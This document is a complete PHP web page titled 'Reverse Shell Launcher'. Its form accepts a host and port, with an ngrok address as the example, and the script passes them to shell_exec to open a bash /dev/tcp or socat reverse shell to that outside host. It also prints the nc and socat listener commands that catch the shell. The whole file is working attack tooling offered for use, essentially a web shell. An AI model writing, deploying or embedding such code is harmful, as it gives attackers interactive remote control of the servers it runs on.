<?php
function print_listener_cmd($method, $port) {
    if ($method === 'nc') {
        return "nc -lvnp $port";
    } elseif ($method === 'socat') {
        return "socat -d -d tcp-l:$port,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sane";
    } else {
        return "Unknown method";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $method = $_POST['method'];
    $target = $_POST['target'];

    echo "<pre>";

    if (preg_match('/^([a-zA-Z0-9\.\-]+):(\d{1,5})$/', $target, $m)) {
        $host = $m[1];
        $port = $m[2];

        if ($method === 'nc') {
            $cmd = "bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'";
        } elseif ($method === 'socat') {
            $cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$host:$port";
        } else {
            echo "Invalid method.";
            exit;
        }

        shell_exec($cmd);

        echo "Reverse shell command executed on target:\n$cmd\n\n";
        echo "Run this on your machine to catch the shell:\n" . print_listener_cmd($method, $port);
    } else {
        echo "Invalid ngrok address format. Use host:port (e.g., 0.tcp.ap.ngrok.io:12345)";
    }

    echo "</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Reverse Shell Launcher</title>
</head>
<body style="background:#ffffff; color:#000000; font-family:monospace; padding:2em;">
    <h2>Reverse Shell Launcher</h2>
    <form method="POST">
        <label>Method:
            <select name="method">
                <option value="nc">Netcat (nc)</option>
                <option value="socat">Socat</option>
            </select>
        </label>
        <br><br>
        <label>Ngrok TCP Address:
            <input type="text" name="target" placeholder="0.tcp.ap.ngrok.io:12345" style="width:300px;">
        </label>
        <br><br>
        <input type="submit" value="Launch Reverse Shell" style="padding:0.5em 1em;">
    </form>
</body>
</html>
